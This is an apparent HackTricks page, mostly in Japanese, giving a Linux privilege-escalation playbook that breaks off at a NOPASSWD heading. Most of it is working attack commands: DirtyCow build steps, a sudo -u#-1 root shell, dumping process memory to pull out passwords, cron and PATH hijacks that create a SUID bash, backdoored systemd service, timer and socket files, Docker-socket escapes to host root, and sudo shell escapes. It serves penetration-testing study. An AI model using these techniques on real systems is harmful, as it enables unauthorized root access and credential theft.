# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS情報

稼働中のOSについての情報収集を始めましょう
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### パス

もし**`PATH` 変数内の任意のフォルダに書き込み権限がある**場合、いくつかの libraries や binaries を hijack できるかもしれません:
```bash
echo $PATH
```
### 環境情報

環境変数に興味深い情報、パスワード、またはAPIキーはありますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

カーネルのバージョンを確認し、escalate privileges に使える exploit があるか確認する
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
脆弱なカーネルの良いリストと、既に **compiled exploits** になっているものはここで見つけられます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
他にも **compiled exploits** が見つかるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのサイトからすべての脆弱なカーネルバージョンを抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits の検索に役立つツール:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (IN victimで実行、kernel 2.x向けのexploitsのみチェック)

必ず **Googleで kernel バージョンを検索** してください。お使いの kernel バージョンが既知の kernel exploit に記載されている可能性があり、その場合その exploit が有効であることを確認できます。

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

以下に示される脆弱な sudo バージョンに基づく:
```bash
searchsploit sudo
```
このgrepを使ってsudoのバージョンが脆弱かどうか確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

提供: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg の署名検証に失敗しました

このvulnがどのように悪用され得るかの**例**は、**smasher2 box of HTB**を参照してください。
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらにシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 可能な防御策を列挙する

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

docker container の中にいる場合、そこから escape を試みることができます:

{{#ref}}
docker-security/
{{#endref}}

## ドライブ

何が**マウントされているか、アンマウントされているか**、どこに、なぜかを確認します。アンマウントされているものがあれば、それをマウントして機密情報を確認してみてください。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**any compiler is installed**か確認してください。これは、kernel exploit を使用する必要がある場合に有用です。実際に使用するマシン（またはそれに類似したマシン）で compile することが推奨されるためです。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアのインストール状況

**インストールされているパッケージやサービスのバージョン**を確認してください。例えば古い Nagios バージョンが存在し、それが escalating privileges に悪用される可能性があります…\  
より疑わしいインストール済みソフトウェアのバージョンは手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
マシンにSSHでアクセスできる場合、**openVAS** を使ってマシン内にインストールされている古い・脆弱なソフトウェアをチェックすることもできます。

> [!NOTE] > _これらのコマンドは大量の情報を表示し、その多くはほとんど役に立たないことに注意してください。したがって、OpenVASなどのツールでインストール済みソフトウェアのバージョンが既知のエクスプロイトに対して脆弱かどうかを確認することを推奨します_

## プロセス

どの**プロセスが**実行されているかを確認し、どのプロセスが**本来より多くの権限を持っているか**をチェックしてください（例えば tomcat が root によって実行されているかもしれません？）
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### プロセス監視

プロセスの監視には [**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使用できます。これは、脆弱なプロセスが頻繁に実行されている場合や特定の条件が満たされたときに識別するのに非常に役立ちます。

### プロセスのメモリ

サーバの一部サービスは**credentials in clear text inside the memory**を保存します。\
通常、他ユーザに属するプロセスのメモリを読むには**root privileges**が必要なため、これは通常既にrootでさらに多くの資格情報を発見したい場合に役立ちます。\
しかし、通常ユーザとしては自分が所有するプロセスのメモリは読むことができる点を忘れないでください。

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: 同じ uid を持っている限り、すべてのプロセスをデバッグできます。これは従来の ptracing の動作方法です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみがデバッグ可能です。
> - **kernel.yama.ptrace_scope = 2**: ptrace を使用できるのは管理者のみで、CAP_SYS_PTRACE capability が要求されます。
> - **kernel.yama.ptrace_scope = 3**: ptrace で追跡できるプロセスはありません。一度設定されると、ptracing を再び有効にするには再起動が必要です。

#### GDB

たとえば FTP サービスのメモリにアクセスできる場合、Heap を取得してその中の credentials を検索することができます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB スクリプト
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

特定のプロセスIDに対して、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマッピングされているかを示します**。また、**各マップ領域の権限**も表示します。**mem** 擬似ファイルは**プロセスのメモリ自体を公開します**。**maps** ファイルからどの **メモリ領域が読み取り可能か** とそのオフセットが分かります。この情報を使って、**mem ファイルをシークして読み取り可能な領域をすべてダンプする** のです。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの **物理** メモリにアクセスするもので、仮想メモリではありません。カーネルの仮想アドレス空間には /dev/kmem を使用してアクセスできます。\
通常、`/dev/mem` は **root** と kmem グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump は、Windows 用の Sysinternals ツールスイートに含まれるクラシックな ProcDump ツールを Linux 向けに再構築したものです。入手はこちら: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをダンプするには、次を使用できます:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root 要件を手動で削除し、自分が所有するプロセスをダンプできます
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root が必要)

### プロセスのメモリからの認証情報

#### 手動の例

authenticator プロセスが実行されているのを見つけた場合:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
processをdumpして（前のセクションを参照してprocessのmemoryをdumpするさまざまな方法を確認してください）、memory内のcredentialsを検索できます：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

このツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、メモリから**平文の認証情報を盗み出し**、およびいくつかの**よく知られたファイル**からも取得します。正しく動作させるには root 権限が必要です。

| 機能                                              | プロセス名             |
| ------------------------------------------------- | -------------------- |
| GDM パスワード (Kali Desktop, Debian Desktop)     | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (アクティブFTP接続)                        | vsftpd               |
| Apache2 (アクティブなHTTP Basic認証セッション)     | apache2              |
| OpenSSH (アクティブなSSHセッション - sudo 使用)     | sshd:                |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

スケジュールされたジョブに脆弱性がないか確認してください。rootで実行されるスクリプトを悪用できないか検討しましょう（wildcard vuln? rootが使用するファイルを変更できるか? symlinksを使えるか? rootが使うディレクトリに特定のファイルを作成できるか?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

例えば、_/etc/crontab_ に次の PATH が記載されています: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ユーザー "user" が /home/user に書き込み権限を持っていることに注意_)

この crontab の中で root ユーザーが PATH を設定せずにコマンドやスクリプトを実行しようとした場合。例えば: _\* \* \* \* root overwrite.sh_\
その場合、次を使って root シェルを取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

スクリプトが root によって実行され、そのコマンド内に “**\***” が含まれている場合、これを利用して予期しない動作（privesc のような）を引き起こすことができます。例:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**wildcardが次のようなパスの前にある場合** _**/some/path/\***_ **、脆弱ではありません（** _**./\***_ **も脆弱ではありません）。**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Cron スクリプトの上書きと symlink

もし root によって実行される **cron script を変更できる**なら、非常に簡単に shell を取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root によって実行されるスクリプトが **あなたが完全にアクセスできるディレクトリ** を使用している場合、そのフォルダを削除して、あなたが制御するスクリプトを配置した別の場所への **symlink フォルダを作成する** ことが有用かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 頻繁に実行される cron ジョブ

プロセスを監視して、1分、2分、または5分ごとに実行されているプロセスを探すことができます。これを利用して、escalate privileges できるかもしれません。

例えば、**0.1秒ごとに1分間監視する**、**実行回数の少ない順にソートする**、そして最も多く実行されたコマンドを削除するには、次のようにします：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**次のツールも使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (これにより開始されるすべてのプロセスが監視・一覧表示されます)。

### 見えない cron jobs

cronjobを**コメントの後にキャリッジリターンを入れる**（改行文字は含めない）ことで作成でき、cron jobは動作します。例（キャリッジリターン文字に注意）:
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込みできるか確認してください。書き込み可能であれば、**改変する**ことでサービスが**開始**、**再起動**、または**停止**されたときにあなたの**backdoor**を**実行する**ようにできます（マシンの再起動を待つ必要があるかもしれません）。\
例えば `.service` ファイル内に **`ExecStart=/tmp/script.sh`** を記述して backdoor を作成します。

### 書き込み可能な service バイナリ

サービスによって実行されるバイナリに対する**書き込み権限がある場合**、それらをバックドアに差し替えることができ、サービスが再実行されるとバックドアが実行されます。

### systemd PATH - 相対パス

次のコマンドで**systemd**が使用する PATH を確認できます:
```bash
systemctl show-environment
```
パス内の任意のフォルダに**書き込み**ができることが判明した場合、**escalate privileges**できる可能性があります。次のようなサービス構成ファイルで**相対パス**が使用されていないか検索する必要があります:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、書き込み可能な systemd PATH フォルダ内に **相対パスのバイナリと同じ名前の** **実行可能ファイル** を作成します。サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）を実行するよう要求されると、あなたの **backdoor** が実行されます（非特権ユーザーは通常サービスの start/stop を実行できませんが、`sudo -l` が使えるか確認してください）。

**サービスについては `man systemd.service` を参照してください。**

## **Timers**

**Timers** は名前が `**.timer**` で終わる systemd ユニットファイルで、`**.service**` ファイルやイベントを制御します。**Timers** はカレンダー時間イベントや単調時間イベントを組み込みでサポートしており、非同期で実行できるため cron の代替として利用できます。

すべてのタイマーは次のコマンドで列挙できます:
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

タイマーを変更できる場合、systemd.unit の既存のユニット（例えば `.service` や `.target`）を実行させることができます。
```bash
Unit=backdoor.service
```
> このタイマーが期限切れになったときにアクティブ化されるユニットです。引数はユニット名で、サフィックスが ".timer" ではない名前になります。指定しない場合、この値はタイマーユニットと同じ名前（サフィックスを除く）を持つ service にデフォルトされます。（上記参照。）アクティブ化されるユニット名とタイマーユニットのユニット名は、サフィックスを除いて同一であることが推奨されます。

したがって、この権限を悪用するには、次のいずれかを満たす必要があります:

- systemd ユニット（例: `.service`）で、**書き込み可能なバイナリを実行している**ものを見つける
- 実行パスが**相対パスで実行している** systemd ユニットを見つけ、かつその実行ファイルを偽装するために **systemd PATH** に対して**書き込み権限**を持っていること

**Learn more about timers with `man systemd.timer`.**

### **タイマーの有効化**

タイマーを有効にするには root 権限が必要で、次を実行します:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意：**timer** は `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` にシンボリックリンクを作成することで**有効化**されます。

## ソケット

Unix Domain Sockets (UDS) はクライアント-サーバモデル内で同一または異なるマシン間の**プロセス間通信**を可能にします。これらは標準の Unix ディスクリプタファイルを用いてコンピュータ間通信を行い、`.socket` ファイルを通じて設定されます。

Sockets は `.socket` ファイルを使って構成できます。

**Learn more about sockets with `man systemd.socket`.** このファイル内では、いくつかの興味深いパラメータを設定できます:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは異なりますが、要約すると**どこでリッスンするかを示す**ために使われます（AF_UNIX ソケットファイルのパス、リッスンする IPv4/6 および/またはポート番号など）。
- `Accept`: ブール引数を取ります。**true** の場合、**各着信接続ごとにサービスインスタンスが生成され**、接続ソケットのみがそのインスタンスに渡されます。**false** の場合、リッスンしているすべてのソケット自体が**起動された service ユニットに渡され**、すべての接続に対して単一の service ユニットのみが生成されます。データグラムソケットおよび FIFO では、この値は無視され、単一の service ユニットが無条件にすべての着信トラフィックを処理します。**Defaults to false**。パフォーマンス上の理由から、新しいデーモンは `Accept=no` に適した方法でのみ作成することが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1 行以上のコマンドラインを取り、これらはリッスンする**sockets**/FIFOs がそれぞれ作成されバインドされる**前**または**後**に**実行されます**。コマンドラインの最初のトークンは絶対パスのファイル名でなければならず、その後にプロセスの引数が続きます。
- `ExecStopPre`, `ExecStopPost`: リッスンする**sockets**/FIFOs がそれぞれクローズおよび削除される**前**または**後**に**実行される**追加の**コマンド**です。
- `Service`: 着信トラフィック時に**起動する****service** ユニット名を指定します。この設定は Accept=no のソケットでのみ許可されます。デフォルトではソケットと同名（サフィックスを置換したもの）の service が使用されます。ほとんどの場合、このオプションを使う必要はありません。

### Writable .socket files

もし **書き込み可能な** `.socket` ファイルを見つけたら、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のようなものを**追加**することができ、バックドアはソケットが作成される前に実行されます。したがって、**おそらくマシンの再起動を待つ必要があるでしょう。**\
_システムがそのソケットファイルの設定を使用していなければ、バックドアは実行されない点に注意してください_

### Writable sockets

もし **書き込み可能なソケット** を特定した場合（_ここでは設定ファイルの `.socket` ではなく Unix ソケットのことを指しています_）、そのソケットと**通信することができ**、脆弱性を突ける可能性があります。

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

注意: 一部に **sockets listening for HTTP** requests が存在することがあります（_.socket files のことではなく、unix sockets として機能するファイルを指しています_）。以下のコマンドで確認できます:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
ソケットが**HTTPで応答する**場合、**通信**でき、場合によっては**exploit some vulnerability**を行えることがあります。

### 書き込み可能な Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Docker APIを直接使用する**

Docker CLIが利用できない場合でも、DockerソケットはDocker APIと`curl`コマンドを使って操作できます。

1.  **List Docker Images:** 利用可能なイメージの一覧を取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ホストシステムのルートディレクトリをマウントするコンテナを作成するリクエストを送信します。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

作成したコンテナを起動します:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat`を使用してコンテナに接続を確立し、コンテナ内でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat`接続を設定した後、ホストのファイルシステムに対するrootレベルのアクセス権でコンテナ内から直接コマンドを実行できます。

### その他

dockerソケットへの書き込み権限があり、**inside the group `docker`** に属している場合は、[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)があります。また、[**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)場合、それを悪用できる可能性があります。

dockerから抜け出す、またはそれを悪用してprivilege escalationするための**more ways to break out from docker or abuse it to escalate privileges**は次を参照してください：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

もし **`ctr`** コマンドを使用できることが判明した場合は、次のページを参照してください。**you may be able to abuse it to escalate privileges**：


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

もし **`runc`** コマンドを使用できることが判明した場合は、次のページを参照してください。**you may be able to abuse it to escalate privileges**：


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Busは高度な**プロセス間通信 (IPC) システム**であり、アプリケーションが効率的に相互作用しデータを共有することを可能にします。現代のLinuxシステムを念頭に設計されており、さまざまな形態のアプリケーション間通信のための堅牢なフレームワークを提供します。

このシステムは柔軟で、プロセス間のデータ交換を強化する基本的なIPC（拡張された**UNIXドメインソケット**を思わせるもの）をサポートします。さらに、イベントやシグナルのブロードキャストを助け、システムコンポーネント間のシームレスな統合を促進します。例えば、Bluetoothデーモンからの着信通話に関するシグナルが音楽プレーヤーにミュートを促すことでユーザ体験が向上する、といった具合です。加えて、D-Busはリモートオブジェクトシステムをサポートしており、アプリケーション間のサービス要求やメソッド呼び出しを簡素化し、従来は複雑であった処理を合理化します。

D-Busは**allow/deny model**で動作し、マッチするポリシールールの累積的効果に基づいてメッセージの権限（メソッド呼び出し、シグナル送出など）を管理します。これらのポリシーはバスとのやり取りを指定し、これらの権限を悪用することでprivilege escalationが可能になる場合があります。

/etc/dbus-1/system.d/wpa_supplicant.conf にあるそのようなポリシーの例が示されており、rootユーザが `fi.w1.wpa_supplicant1` を所有し、送信および受信できる権限について詳述しています。

ユーザやグループが指定されていないポリシーは普遍的に適用され、"default" コンテキストのポリシーは他の特定のポリシーにカバーされていないすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**ここで D-Bus 通信を enumerate して exploit する方法を学んでください:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを enumerate してマシンの位置を把握するのは常に興味深い。

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

アクセスする前に操作できなかったマシン上で稼働しているネットワークサービスを必ず確認してください:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

sniff trafficができるか確認してください。できれば、いくつかのcredentialsを取得できるかもしれません。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

自分が**誰**か、どの**権限**を持っているか、システム内にどの**ユーザー**がいるか、どれが**login**できるか、どれが**root privileges**を持っているかを確認してください:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

一部の Linux バージョンは、**UID > INT_MAX** のユーザが権限を昇格できるバグの影響を受けていました。More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

root 権限を付与する可能性のあるグループの**メンバーかどうか**を確認してください:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

可能であれば、クリップボード内に興味深いものがないか確認してください
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境のパスワードを**知っている場合は**、そのパスワードを使って**各ユーザーにログインしてみてください**。

### Su Brute

大量のノイズが出ることを気にしない場合、かつコンピュータに`su`と`timeout`のバイナリが存在するなら、[su-bruteforce](https://github.com/carlospolop/su-bruteforce)を使ってユーザーをブルートフォースしてみることができます.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)は`-a`パラメータでユーザーのブルートフォースも試みます。

## 書き込み可能なPATHの悪用

### $PATH

もし**$PATHのいずれかのフォルダに書き込みできる**ことが分かったら、別のユーザー（理想的には root）が実行するコマンド名で、**書き込み可能なフォルダ内にbackdoorを作成すること**により権限を昇格できる可能性があります。ただし、そのコマンドが$PATH内で**あなたの書き込み可能フォルダより前に位置するフォルダから読み込まれない**場合に限ります。

### SUDO and SUID

sudoで実行できるコマンドが許可されている、あるいはコマンドにsuidビットが設定されている可能性があります。確認するには次を使用してください：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
いくつかの**予期しないコマンドはファイルを読み書きしたり、場合によってはコマンドを実行したりすることがあります。** 例えば:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

